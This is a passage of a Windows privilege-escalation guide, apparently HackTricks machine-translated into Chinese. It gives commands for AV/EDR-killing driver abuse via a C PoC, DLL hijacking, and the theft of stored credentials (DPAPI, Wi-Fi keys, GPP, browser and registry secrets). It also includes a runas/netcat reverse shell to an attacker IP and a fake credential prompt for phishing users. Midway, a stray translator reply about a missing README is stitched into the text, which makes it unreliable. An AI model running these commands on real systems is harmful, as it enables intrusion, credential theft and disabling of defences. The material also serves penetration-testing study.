privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

查找可能的 **third party weird/vulnerable** drivers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
如果驱动暴露了一个 arbitrary kernel read/write primitive（常见于设计不良的 IOCTL handlers），你可以通过直接从内核内存窃取 SYSTEM token 来提升权限。详见逐步技术：

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

对于会在易受攻击的调用中打开由攻击者控制的 Object Manager path 的 race-condition bugs，通过故意放慢查找（使用最大长度的组件或深层目录链）可以将时间窗从微秒延长到数十微秒：

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive 内存损坏 原语

现代的 hive 漏洞允许你修整出确定性的布局，滥用可写的 HKLM/HKU 子项，并在无需自定义驱动的情况下将元数据损坏转换为 kernel paged-pool overflows。完整链见：

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

一些已签名的第三方驱动通过 IoCreateDeviceSecure 使用强 SDDL 创建它们的 device object，但忘记在 DeviceCharacteristics 中设置 FILE_DEVICE_SECURE_OPEN。没有这个标志，当通过包含额外组件的路径打开 device 时，secure DACL 不会被强制执行，这允许任何未特权用户通过使用类似的命名空间路径获得句柄：

- \\.\DeviceName\anything
- \\.\amsdk\anyfile (from a real-world case)

一旦用户可以打开该 device，驱动暴露的特权 IOCTLs 可被滥用于 LPE 和篡改。实际案例中观察到的示例能力：
- 返回对任意进程的完全访问句柄（token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser）。
- 不受限制的 raw disk read/write（离线篡改、启动时持久化技巧）。
- 终止任意进程，包括 Protected Process/Light (PP/PPL)，允许通过 kernel 从 user land 杀死 AV/EDR。

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- 在为打算受 DACL 限制的 device objects 创建时，始终设置 FILE_DEVICE_SECURE_OPEN。
- 对特权操作验证调用者上下文。在允许进程终止或返回句柄之前，添加 PP/PPL 检查。
- 限制 IOCTLs（access masks、METHOD_*、输入验证），并考虑使用 brokered models 而不是直接的 kernel privileges。

Detection ideas for defenders
- 监控对可疑 device names（例如 \\ .\\amsdk*）的 user-mode opens，以及指示滥用的特定 IOCTL 序列。
- 强制启用 Microsoft’s vulnerable driver blocklist（HVCI/WDAC/Smart App Control），并维护你自己的 allow/deny 列表。


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
有关如何滥用此检查的更多信息：


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## 网络

### 共享
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

检查 hosts file 中是否有其他已知计算机的硬编码条目
```
type C:\Windows\System32\drivers\etc\hosts
```
### 网络接口和 DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 开放端口

从外部检查**受限服务**
```bash
netstat -ano #Opened ports?
```
### 路由表
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP 表
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### 防火墙规则

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(列出规则，创建规则，关闭，关闭...)**

更多[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows 的 Linux 子系统 (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
二进制文件 `bash.exe` 也可以在 `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` 找到。

如果获得 root user 权限，你可以监听任意端口（第一次使用 `nc.exe` 在端口上监听时，GUI 会询问是否允许 `nc` 通过 firewall）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
要方便地以 root 身份启动 bash，您可以尝试 `--default-user root`

您可以在文件夹 `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` 中浏览 `WSL` 文件系统

## Windows 凭证

### Winlogon 凭证
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### 凭据管理器 / Windows Vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault 存储服务器、网站和其他程序的用户凭据，供 **Windows** **自动为用户登录** 使用。乍看之下，这似乎意味着用户可以将他们的 Facebook、Twitter、Gmail 等凭据存储起来，以便通过浏览器自动登录。但事实并非如此。

Windows Vault 存储的是 **Windows 可以自动为用户登录的凭据**，这意味着任何需要凭据以访问资源（服务器或网站）的 **Windows 应用程序** **可以使用这个 Credential Manager** & Windows Vault，并使用存储的凭据，而无需用户每次都输入用户名和密码。

除非应用程序与 Credential Manager 交互，否则我认为它们不可能使用某个资源的凭据。因此，如果你的应用想使用该 vault，它应当以某种方式 **与 credential manager 通信并从默认存储 vault 请求该资源的凭据**。

使用 `cmdkey` 列出机器上存储的凭据。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
然后你可以使用 `runas` 的 `/savecred` 选项来使用已保存的凭据。下面的示例通过 SMB share 调用远程 binary。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
使用 `runas` 并使用提供的一组 credential。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
注意 mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)，或者来自 [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)。

### DPAPI

**数据保护 API (DPAPI)** 提供了一种对数据进行对称加密的方法，主要在 Windows 操作系统中用于对非对称私钥进行对称加密。该加密利用用户或系统的 secret 来显著增加熵。

**DPAPI 允许通过从用户登录 secret 派生的对称密钥来加密密钥**。在涉及系统加密的场景中，它使用系统的域认证 secret。

使用 DPAPI 加密的用户 RSA 密钥存储在 `%APPDATA%\Microsoft\Protect\{SID}` 目录中，其中 `{SID}` 表示用户的 [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)。**DPAPI 密钥与保护用户私钥的主密钥位于同一文件中**，通常由 64 字节的随机数据组成。（需要注意的是，对该目录的访问是受限的，无法通过 CMD 中的 `dir` 命令列出其内容，但可以通过 PowerShell 列出。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
你可以使用 **mimikatz module** `dpapi::masterkey` 并带上相应参数（`/pvk` 或 `/rpc`）来解密它。

**由主密码保护的凭据文件**通常位于：
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
你可以使用 **mimikatz module** `dpapi::cred`，配合相应的 `/masterkey` 来解密。\
你可以用 `sekurlsa::dpapi` 模块从 **内存** 中提取许多 **DPAPI 主密钥**（如果你是 root）。


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell 凭据

**PowerShell credentials** 常用于 **脚本** 和自动化任务，作为便捷地存储加密凭据的方式。 这些凭据使用 **DPAPI** 保护，这通常意味着它们只能由在相同计算机上创建它们的相同用户解密。

要从包含凭据的文件中 **解密** PS 凭据，你可以这样做：
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### 无线网络
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 已保存的 RDP 连接

可以在 `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
以及在 `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### 最近运行的命令
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **远程桌面凭证管理器**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
你可以使用 **Mimikatz** `sekurlsa::dpapi` 模块从内存中**extract many DPAPI masterkeys**

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **保存密码** 和其他信息，而不知道它实际上是一个数据库文件。该文件位于 `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`，值得搜索和检查。

### AppCmd.exe

**注意：要从 AppCmd.exe 恢复密码，你需要是 Administrator 并在 High Integrity 级别下运行。**\
**AppCmd.exe** 位于 `%systemroot%\system32\inetsrv\` 目录下。\
如果此文件存在，则可能已配置了一些 **credentials** 并可以被 **recovered**。

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

检查 `C:\Windows\CCM\SCClient.exe` 是否存在 .\
安装程序 **以 SYSTEM 权限 运行**，许多容易受到 **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## 文件与注册表 (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH 主机密钥
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys 在注册表中

SSH private keys 可以存储在注册表键 `HKCU\Software\OpenSSH\Agent\Keys` 中，所以你应该检查那里是否有任何有趣的内容：
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
如果你在该路径中找到任何条目，它很可能是一个保存的 SSH 密钥。  
它以加密形式存储，但可以使用 [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) 轻松解密。\  
更多关于此技术的信息： [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

如果 `ssh-agent` 服务未运行并且你希望它在开机时自动启动，请运行：
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> 看起来这个技术已不再有效。我尝试创建了一些 `ssh` 密钥，用 `ssh-add` 添加并通过 `ssh` 登录到一台机器。但注册表 HKCU\Software\OpenSSH\Agent\Keys 不存在，procmon 在非对称密钥认证期间也没有识别到 `dpapi.dll` 的使用。

### 无人值守文件
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
你也可以使用 **metasploit** 搜索这些文件： _post/windows/gather/enum_unattend_

示例内容：
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM 备份
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### 云凭据
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

搜索名为 **SiteList.xml** 的文件

### Cached GPP Pasword

之前有一项功能允许通过 Group Policy Preferences (GPP) 在一组机器上部署自定义本地管理员账户。然而，这种方法存在严重的安全缺陷。首先，Group Policy Objects (GPOs)，以 XML 文件形式存储在 SYSVOL 中，任何域用户都可以访问。其次，这些 GPP 中的密码使用 AES256 并用一个公开记录的默认密钥进行了加密，任何已认证用户都可以解密。这构成了严重风险，因为它可能使用户获得提升的权限。

为缓解该风险，开发了一个函数来扫描本地缓存的 GPP 文件，查找包含不为空的 "cpassword" 字段的文件。发现此类文件后，该函数会解密密码并返回一个自定义的 PowerShell object。该对象包含有关 GPP 及文件位置的详细信息，便于识别和修复此安全漏洞。

在 `C:\ProgramData\Microsoft\Group Policy\history` 或在 _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history**（Windows Vista 之前）_ 中搜索以下文件：

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**要解密 cPassword：**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
使用 crackmapexec 获取密码：
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web 配置
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
包含凭据的 web.config 示例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 凭据
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### 日志
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Ask for credentials

你可以总是**要求用户输入他的 credentials 或者甚至其他用户的 credentials**，如果你认为他可能知道（注意直接向客户端**询问**其**credentials**是非常**危险**的）：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **可能包含 credentials 的 文件名**

已知有些文件曾在一段时间内以 **clear-text** 或 **Base64** 形式包含 **passwords**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
我没有收到 src/windows-hardening/windows-local-privilege-escalation/README.md 的内容。请粘贴该文件的原文或上传文件，或指定要翻译的具体文件集合。我将按要求翻译并保留所有 markdown/html 标签与路径。
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### 回收站中的凭据

你还应该检查回收站，查找其中的凭据

要 **恢复由多个程序保存的密码**，你可以使用: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### 在注册表中

**其他可能包含凭据的注册表键**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### 浏览器历史

你应该检查保存 **Chrome 或 Firefox** 密码的数据库。\
也要检查浏览器的历史记录、书签和收藏夹，因为可能有些 **密码** 存储在那里。

从浏览器提取密码的工具：

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** 是内置于 Windows 操作系统的一项技术，允许不同语言的软件组件之间的**互通**。每个 COM 组件都**通过 class ID (CLSID) 进行标识**，并且每个组件通过一个或多个接口（由 interface IDs (IIDs) 标识）公开功能。

COM 类和接口分别在注册表的 **HKEY\CLASSES\ROOT\CLSID** 和 **HKEY\CLASSES\ROOT\Interface** 下定义。该注册表由 **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** 合并生成，即 **HKEY\CLASSES\ROOT.**

在该注册表的 CLSID 项目下，你可以找到子项 **InProcServer32**，其中包含一个指向 **DLL** 的**默认值**，以及名为 **ThreadingModel** 的值，其可以是 **Apartment** (Single-Threaded)、**Free** (Multi-Threaded)、**Both** (Single or Multi) 或 **Neutral** (Thread Neutral)。

![](<../../images/image (729).png>)

基本上，如果你能够**覆盖任一将被执行的 DLL**，当该 DLL 被不同用户执行时，你就可能**提升权限**。

若要了解攻击者如何利用 COM Hijacking 作为持久化机制，请参阅：

{{#ref}}
com-hijacking.md
{{#endref}}

### **在文件和注册表中通用的密码搜索**

**搜索文件内容**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**搜索具有特定文件名的文件**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**在注册表中搜索键名和密码**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### 搜索密码的工具

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **是一个 msf** 插件，我创建此插件用于 **在受害者主机上自动执行每个 metasploit POST 模块来搜索凭证**。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 自动搜索本页中提到的所有包含密码的文件。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) 是另一个从系统中提取密码的优秀工具。

工具 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) 搜索若干工具以明文保存的数据中的 **会话**, **用户名** 和 **密码**（PuTTY, WinSCP, FileZilla, SuperPuTTY, 和 RDP）
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

想象一个 **以 SYSTEM 身份运行的进程使用 `OpenProcess()` 打开了一个新进程** 并获得了 **full access**。同一进程 **也使用 `CreateProcess()` 创建了一个新进程**，该进程 **权限较低但继承了主进程的所有打开句柄**。\
然后，如果你对该低权限进程拥有 **full access**，你可以获取使用 `OpenProcess()` 打开的对高权限进程的 **打开句柄** 并 **inject a shellcode**。\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

共享的内存段，称为 **pipes**，用于进程间通信和数据传输。

Windows 提供了名为 **Named Pipes** 的功能，允许不相关的进程共享数据，甚至跨网络。这类似于客户端/服务器架构，角色定义为 **named pipe server** 和 **named pipe client**。

当 **client** 通过 pipe 发送数据时，建立该 pipe 的 **server** 可以在拥有必要的 **SeImpersonate** 权限的前提下 **冒充（take on the identity）** 该 **client**。识别出通过你可以模拟的 pipe 与之通信的 **有特权进程**，一旦该进程与您建立的 pipe 交互，就有机会通过采用该进程的身份来 **gain higher privileges**。关于如何实施此类攻击的说明，请参见 [**here**](named-pipe-client-impersonation.md) 和 [**here**](#from-high-integrity-to-system)。

此外，下面的工具允许你 **使用类似 burp 的工具拦截 named pipe 通信：** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **而这个工具允许列出并查看所有 pipe 以发现 privescs：** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

